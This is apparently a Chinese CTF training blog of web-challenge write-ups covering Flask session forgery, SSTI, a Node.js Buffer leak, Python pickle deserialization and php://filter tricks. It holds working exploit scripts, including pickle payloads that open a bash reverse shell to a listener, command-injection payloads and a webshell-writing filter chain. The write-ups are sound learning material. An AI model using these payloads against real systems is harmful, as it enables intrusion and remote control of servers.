<p>最后点击图片可以下载，抓包康康；这种样子不禁让人觉得有文件包含漏洞，用<code>/etc/passwd</code>测试是否存在文件包含漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/fb66bfaf3f5b4dd1aa5ef8c6b73d22ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>目录穿越之后实现了文件包含</p>
<p><img src="https://img-blog.csdnimg.cn/7bec789db81d4ddcb8cc4b7565765c00.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>看师傅的<a href="https://blog.csdn.net/weixin_44037296/article/details/111469361">wp</a>，学到的新知识：</p>
<p>（因为这里用到了flask session伪造，所以应该是python的环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self 指向当前的进程</span><br><span class="line">/environ 当前进程的变量环境信息</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/eceb6ce2b2474078bcac2ad4581fab88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>得到密钥那就直接伪造，修改session，购买flag吧</p>
<p><img src="https://img-blog.csdnimg.cn/d494bbde6fab49a2827d5f31b4a235d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h4><ul>
<li>flask session伪造</li>
<li><code>&#123;&#123;config&#125;&#125;</code></li>
</ul>
<p>打开靶机，是一个计算器</p>
<p><img src="https://img-blog.csdnimg.cn/7fe2d938ac4740dbbf6b73dffa42b5ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>测试几次之后，抓包发现session，kali中解密之后可以确定是flask session，我们可以进行伪造，既然已经知道是flask框架，然后执行的代码又是<code>&#123;&#39;1+1&#39;&#125;</code>这样的，那么可以猜测是ssti注入</p>
<p>但是同样的，重点还是找到密钥</p>
<p>这里利用<code>&#123;&#123;config&#125;&#125;</code>，不过这里必须要是再前面的运算报错的情况下才能实现，这或许和后端的check有关（？可以去看一下源码</p>
<p>利用注释绕过判断，但是在执行过程中又会执行，得到密钥</p>
<p><img src="https://img-blog.csdnimg.cn/fa93f28b618e4da69963ee06220ff5cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>之后直接打payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;ls\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>发现有flag.txt</p>
<p><img src="https://img-blog.csdnimg.cn/dd7c034961e74355863ed4d98a377507.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>直接cat就好啦</p>
<p>payload2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat flag.txt\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h4><ul>
<li>python脚本编写</li>
</ul>
<p>简单来说，transmissions两边的<code>kxkxkxkxsh</code>都不会改变，而中间的<code>0b29</code>指的是第29位是b，第28位是0，直接写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://efbfb7c1-8fd8-4ed9-9a4d-0e065c79e0e3.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res = requests.session()</span><br><span class="line">r = res.get(url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;frequency=1; transmissions=kxkxkxkxsh0b29kxkxkxkxsh&#x27;</span>&#125;)</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">fflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>): <span class="comment"># 这里最好是要100此，难免会出现重复的transmissions导致最后的结果错误</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = res.get(url)</span><br><span class="line">    cookies = r.cookies</span><br><span class="line">    ans = <span class="built_in">str</span>(cookies[<span class="string">&#x27;transmissions&#x27;</span>])</span><br><span class="line">    ans = ans.replace(<span class="string">&#x27;kxkxkxkxsh&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;%7B&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;%7D&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    index = ans[<span class="number">2</span>:]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)] = ans[<span class="number">1</span>]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)-<span class="number">1</span>] = ans[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------loading-------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    fflag += <span class="built_in">str</span>(flag[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(fflag)</span><br></pre></td></tr></table></figure>

<h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4><p>学到的新知识点：</p>
<p><strong>0x01:</strong></p>
<p><code>/proc/self</code> 指向当前进程</p>
<p><code>/environ</code> 指向进程的环境变量信息</p>
<p>做了好多flask session伪造</p>
<p><strong>0x02:</strong></p>
<p>利用<code>&#123;&#123;config&#125;&#125;</code>获取环境变量</p>
<p>flask框架ssti注入</p>
<p><strong>———————–TBC—————————</strong></p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第三周学习</title>
    <url>/2022/02/12/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%89%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h4><ul>
<li>nodejs</li>
</ul>
<p>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</p>
<p>也就是可以利用Buffer()来读取内存</p>
<hr>
<span id="more"></span>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">&quot;randomstring&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">&quot;./config.js&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var flag_&quot;</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="string">&quot;&#125;\&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">&quot;eval -&gt;&quot;</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;listening on port 3000!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>审计源码可以知道定义和flag，但是flag变量名字未知，但是<code>res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));</code>使得我们可以执行任意代码</p>
<p>不过由于没怎么做过nodejs类型的题目，所以看了别的师傅的wp</p>
<p>可以知道这里利用nodejs沙箱逃逸进行任意代码执行</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://32ae46a5-a44c-452f-bf07-0b157261450b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;?data=Buffer(500)&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h4><ul>
<li>session伪造</li>
<li>python序列化 <code>__reduce__</code></li>
</ul>
<p><code>Pickle</code>的<code>dumps</code>和<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

<p><code>__reduce__</code>:</p>
<p>在用pickle的时候将该返回值进行序列化和反序列化（或许是这样，可能之后会进行修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你进行了反序列化&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">    usr = _pickle.dumps(User())</span><br><span class="line">    <span class="built_in">print</span>(_pickle.loads(usr))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>) </span><br></pre></td></tr></table></figure>

<hr>
<p>获取到源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.熟悉的<code>secret_key</code> 加上flask框架直接用以前的脚本进行session伪造就好了</p>
<p>2.定义了一个<code>User</code>类，可知我们要伪造的内容为<code>uname:admin is_admin:1</code></p>
<p>3.利用python的pickle的dumps和loads进行序列化和反序列化</p>
<p>所以可以利用<code>__reduce__</code>方法进行命令执行</p>
<p>exp：（最好在linux python2环境</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>flask-session 伪造</code></p>
<p><img src="https://img-blog.csdnimg.cn/6fbbf284a9dd44b5ae70566c1e1609c5.png" alt="img"></p>
<p>根据形式将上面exp得到的内容放进去并利用密钥进行加密</p>
<p><img src="https://img-blog.csdnimg.cn/9ec455b9804040658958df717eda7b64.png" alt="img"></p>
<p>最后抓包，访问<code>/admin</code>修改session，在vps上进行监听</p>
<p>就可以啦</p>
<p><img src="https://img-blog.csdnimg.cn/ea28f9e9c0f0436a9fb9f091bde072d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h4><ul>
<li>python pickle序列化</li>
</ul>
<p>一看题目就能知道是python序列化和反序列化了，可以查看到session，进行base4解码之后是乱码，但是我们可以直接进行反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/e1e89602e4394c93b38d79a2b5237715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(base64.b64decode(<span class="string">&#x27;gAN9cQAoWAUAAABtb25leXEBTZABWAcAAABoaXN0b3J5cQJdcQNYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRhWBAAAABhbnRpX3RhbXBlcl9obWFjcQVYIAAAADQ2NGZiNTE5ZWNjZDkwMDM3Y2E4MDczMTlkNDU3ODZkcQZ1Lg==&#x27;</span>)))</span><br><span class="line"><span class="comment">#&#123;&#x27;money&#x27;: 400, &#x27;history&#x27;: [&#x27;Yummy smörgåsgurka&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;464fb519eccd90037ca807319d45786d&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以猜测后端存在base64解码之后的反序列化，那么直接上exp：（上题的exp仍然适用 在linux python2中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br></pre></td></tr></table></figure>

<p>在vps上监听，抓包</p>
<p><img src="https://img-blog.csdnimg.cn/5cdab4bd0ffa443b870b763111c8d9d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h4><ul>
<li>php</li>
</ul>
<p><a href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md">参考</a></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>); </span><br><span class="line">var_dump(<span class="string">&quot;Sandbox:&quot;</span>.<span class="variable">$sandbox</span>); <span class="comment">#当前路径</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>)) <span class="comment"># ban了php伪协议用到的一些关键词</span></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>)) </span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>审计代码之后可以想到利用点在于<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>，之前做过类似的使用<code>php://filter</code>过滤器的base64，直接把前面的exit()绕过，但是这次base64被ban了，只能利用其他过滤器</p>
<p><a href="https://segmentfault.com/a/1190000018991087#item-2">php://filter</a>在这里可以找到可利用的</p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/c9041e2332f9497fa28888e250d60e10.png" alt="img"></p>
</blockquote>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[&#x27;cmd&#x27;]);?&gt;/resource=a.php</span><br></pre></td></tr></table></figure>

<p>之后利用已知的路径去访问<code>a.php</code>，利用shell得到flag</p>
<h4 id="蓝帽杯-2021-One-Pointer-PHP（未学完）"><a href="#蓝帽杯-2021-One-Pointer-PHP（未学完）" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP（未学完）"></a>[蓝帽杯 2021]One Pointer PHP（未学完）</h4><p>给了源码：</p>
<p><code>add_api.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先审计代码，可以知道我们要绕过<code>if($count[]=1)</code></p>
<p>这里利用int溢出就可以了</p>
